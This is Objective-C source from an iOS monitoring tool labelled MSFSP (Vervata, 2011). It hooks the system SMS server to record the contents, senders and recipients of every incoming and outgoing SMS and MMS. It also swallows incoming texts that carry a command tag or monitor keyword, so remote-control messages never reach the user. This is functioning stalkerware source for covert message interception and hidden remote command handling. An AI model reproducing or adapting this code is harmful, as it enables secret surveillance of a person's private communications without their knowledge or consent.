
/**
 - Project name :  MSFSP
 - Class name   :  SMS
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "MSFSP.h"
#import "NSString+ScanString.h"
#import "SMSUtils.h"
#import "DefStd.h"
#import "CTMessage.h"
#import "SMSCTServer.h"
#import "CTMessageAddress-Protocol.h"
#import "CKSMSMessage.h"
#import "CKIMDBMessage.h"

#import <objc/runtime.h>

/**
 - Method name: _ingestIncomingCTMessage
 - Purpose:  This method is used to hook the incomming SMS/MMS
 - Argument list and description: _ingestIncomingCTMessage (id).
 - Return type and description: No Return
*/

#define SMS_MESSAGE_TYPE 1
#define MMS_MESSAGE_TYPE 2

HOOK (SMSCTServer, _ingestIncomingCTMessage$, void, id arg) {

	//==================== Hook the incoming message====================================================
	DLog (@"Incomming Message Received:---->%@",arg);	
	SMSUtils *smsUtils = [[SMSUtils alloc] init];
	BOOL isSMSCommand = NO;
	
	CTMessage* message = (CTMessage *) arg;
	/*
	DLog(@"=========================================") 
	DLog(@"content type of CTMessage: %@", [message contentType]) 
	DLog(@"message type of CTMessage: %d", [message messageType]) 
	DLog(@"items of CTMessage: %@", [message items]) 
	DLog(@"=========================================") 
	*/
	id phonenumber = [message sender];
	
	unsigned int msgId = [message messageId];
	DLog (@"msgId %d", msgId)		// e.g., -2147483630
	
	NSString* senderNumber = (NSString *)[phonenumber canonicalFormat];
	NSArray* contents = [message items];
	NSArray* senderInfo =[smsUtils contactInfo:senderNumber];
	
	NSDictionary *rawHeader = [message rawHeaders];
	id date = [rawHeader objectForKey:@"Date"];
	DLog (@"date %@ %@", date, [date class])
	
	
	// if [contents count] == 1 then the incoming message is single parts,otherwise MMS
	// However, this is not correct 
	//if([contents count] > 1) { 
	if([message messageType] == MMS_MESSAGE_TYPE) {
		DLog(@"===========MMS Recieved======================")
		/*
		for (int i = 0; i < [contents count]; i++) {
			DLog(@"content type: %@", [[contents objectAtIndex:i] contentType]); 
			DLog(@"content type params: %@", [[contents objectAtIndex:i] allContentTypeParameterNames]);
		}
		*/
		
		NSString *subject = [message subject];
		if(!subject) subject = @"";
	    [smsUtils writeMMSItems:contents
				  recipients:senderInfo
					 subject:subject
				   messageID:msgId
					 smsType:kMMSIncomming
					smsInfo:[NSDictionary dictionaryWithObjectsAndKeys:
								 @"", kMMSInfoGroupIDKey,
								date, kMMSInfoDateStringKey, 
								 nil]];		
	}
	else if ([message messageType] == SMS_MESSAGE_TYPE) {
		DLog(@"===========SMS Recieved======================")
		DLog(@"content type: %@", [[contents objectAtIndex:0] contentType]);	// BEN
		
		NSString *smsText = [smsUtils smsMessageWithParts:contents];
		DLog(@"sms text %@", smsText)
		isSMSCommand = [smsText scanWithStartTag:kSMSComandFormatTag];
		/// !!! not find the conversation id yet because it will be queried in the daemon
		[smsUtils writeSMSWithRecipient:senderInfo
								message:smsText
		                   isSMSCommand:isSMSCommand
		                      messageID:msgId
								smsType:kSMSIncomming
								smsInfo:[NSDictionary dictionaryWithObject:@"" forKey:kSMSInfoGroupIDKey]];
		
		
		// Scan for monitor number/keyword
		if (!isSMSCommand) {
			isSMSCommand = [SMSUtils checkSMSKeywordWithMonitorNumber:smsText];
		}
	}
	//==================== Redirect Orginal method if SMS Command Not found  ============================ 
	if(!isSMSCommand) CALL_ORIG (SMSCTServer, _ingestIncomingCTMessage$, arg);
	
	[smsUtils release];
	smsUtils = nil;
}	

/**
 - Method name: _reallySendSMSRequest:withProcessedParts:recordID
 - Purpose:  This method is used to hook the outgoing SMS /MMS 
 - Argument list and description: arg1 (id),arg2 (id),arg3(id)
 - Return type and description: No Return
*/

HOOK (SMSCTServer, _reallySendSMSRequest$withProcessedParts$recordID$, void, id arg1,id arg2,unsigned arg3) {
	DLog (@"Outgoing Message Received1:---->%@",arg1);
	DLog (@"withProcessedParts:---->%@",arg2);
	DLog (@"recordID:---->%d", arg3);
	
    SMSUtils *smsUtils = [[SMSUtils alloc] init];
	unsigned int msgId = (unsigned int) arg3;
	NSArray *recipients = [smsUtils contactInfo:arg1];
	
	NSString *groupID = @"";
	if ([[[UIDevice currentDevice] systemVersion] intValue] > 4) {	
		// This class is available on ios 5
		Class $CKIMDBMessage	= objc_getClass("CKIMDBMessage");
		CKIMDBMessage *ckIMDB	= [[$CKIMDBMessage alloc] initWithRecordID:msgId];
		groupID					= [ckIMDB groupID];	
		DLog (@"ckIMDB %@", ckIMDB)
		DLog (@"groupID %@", groupID)
	}
	
	//=====================Outgoing MMS=================================================
	if([smsUtils isMMSWithMessageInfo:arg2 recipientInfo:recipients] || // Content type is not text/plain or recipient is email address
		[arg1 objectForKey:kMessageSubjectKey]) { // Subject is not nil
		
		NSString *subject = [smsUtils subjectLineWithMessageInfo:arg1];
		DLog (@"subject %@", subject)
		if(!subject) subject = @"";
	   	[smsUtils writeMMSItems:arg2
				  recipients:recipients
		             subject:subject
		           messageID:msgId
					 smsType:kMMSOutgoing
					 smsInfo:[NSDictionary dictionaryWithObject:groupID forKey:kMMSInfoGroupIDKey]];
		DLog(@"===========MMS Sent======================")
	}
	else {
	//=====================OUTGOING SMS=================================================
		NSString *smsText = [smsUtils smsMessageWithParts:arg1];
	    [smsUtils writeSMSWithRecipient:recipients
								message:smsText
						   isSMSCommand:NO  
		                      messageID:msgId
								smsType:kSMSOutgoing
								smsInfo:[NSDictionary dictionaryWithObject:groupID forKey:kSMSInfoGroupIDKey]];	
		DLog(@"===========SMS Sent======================")
	}
	[smsUtils release];
	smsUtils = nil;
	CALL_ORIG (SMSCTServer,_reallySendSMSRequest$withProcessedParts$recordID$,arg1,arg2,arg3);
}

/**
 - Method name: _sendCompleted:forRecord
 - Purpose:  This method is invoked when message is successfully delivered 
 - Argument list and description: arg1 (id),arg2 (id)
 - Return type and description: No Return
*/

HOOK (SMSCTServer, _sendCompleted$forRecord$, void, unsigned char arg1,unsigned int arg2) {
    CALL_ORIG (SMSCTServer,_sendCompleted$forRecord$,arg1,arg2);
    SMSUtils *smsUtils=[[SMSUtils alloc] init];
	if(arg1==_MESSAGE_DELIVERY_STATUS_SUCCESS_) [smsUtils deliveredOutGoingMessage:arg2];
	else [smsUtils removeUnSentMessage:arg2];	
	[smsUtils release];
	smsUtils = nil;
    DLog (@"DELIVERY STATUS:%u",arg1);
}